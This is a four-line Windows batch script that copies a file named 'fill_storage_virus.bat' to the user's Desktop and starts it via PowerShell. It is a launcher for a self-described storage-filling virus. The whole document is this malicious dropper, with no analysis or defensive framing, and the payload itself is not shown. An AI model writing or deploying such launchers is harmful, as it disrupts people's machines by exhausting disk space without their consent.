@echo off
copy fill_storage_virus.bat %USERNAME%\Desktop
powershell.exe -noexi "cd %USERNAME%\Desktop; start fill_storage_virus.bat"
exit